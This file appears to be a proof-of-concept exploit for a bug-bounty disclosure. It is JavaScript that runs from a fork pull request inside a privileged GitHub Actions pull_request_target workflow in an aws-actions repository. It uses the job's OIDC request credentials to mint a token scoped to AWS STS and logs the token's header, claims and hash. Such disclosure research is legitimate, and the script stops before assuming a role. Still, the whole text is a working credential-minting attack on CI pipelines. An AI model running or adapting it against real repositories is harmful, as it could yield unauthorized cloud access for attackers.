// Minimal security PoC (AWS VDP scope: github.com/aws-actions/*).
// Demonstrates that code from a FORK pull request executes inside the
// privileged pull_request_target job (.github/workflows/integ.yml), which has
// `permissions: id-token: write` and `environment: integ-test`, before the
// workflow assumes an AWS role. This script reads nothing, changes nothing and
// exits non-zero so the pipeline stops BEFORE any AWS resource is created.
const https = require('https');
const crypto = require('crypto');
const MARKER = 'AWSVDP-POC-7f3a91';
const url = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
const tok = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
console.log(`${MARKER} start id_token_url_present=${!!url} request_token_present=${!!tok}`);
console.log(`${MARKER} repo=${process.env.GITHUB_REPOSITORY} workflow=${process.env.GITHUB_WORKFLOW} job=${process.env.GITHUB_JOB} event=${process.env.GITHUB_EVENT_NAME} ref=${process.env.GITHUB_REF}`);
const req = https.request(`${url}&audience=sts.amazonaws.com`, { headers: { Authorization: `bearer ${tok}` } }, (res) => {
  let d = '';
  res.on('data', (c) => (d += c));
  res.on('end', () => {
    try {
      const t = JSON.parse(d).value;
      const [h, p] = t.split('.');
      console.log(`${MARKER} oidc_http_status=${res.statusCode}`);
      console.log(`${MARKER} oidc_header=${Buffer.from(h, 'base64url').toString()}`);
      console.log(`${MARKER} oidc_claims=${Buffer.from(p, 'base64url').toString()}`);
      console.log(`${MARKER} oidc_token_sha256_16=${crypto.createHash('sha256').update(t).digest('hex').slice(0, 16)} token_len=${t.length}`);
      console.log(`${MARKER} RESULT=PRIVILEGED_CODE_EXECUTION_AND_OIDC_TOKEN_MINTED`);
    } catch (e) {
      console.log(`${MARKER} parse_fail=${e.message} raw=${d.slice(0, 200)}`);
    }
    process.exit(1);
  });
});
req.on('error', (e) => { console.log(`${MARKER} err=${e.message}`); process.exit(1); });
req.end();
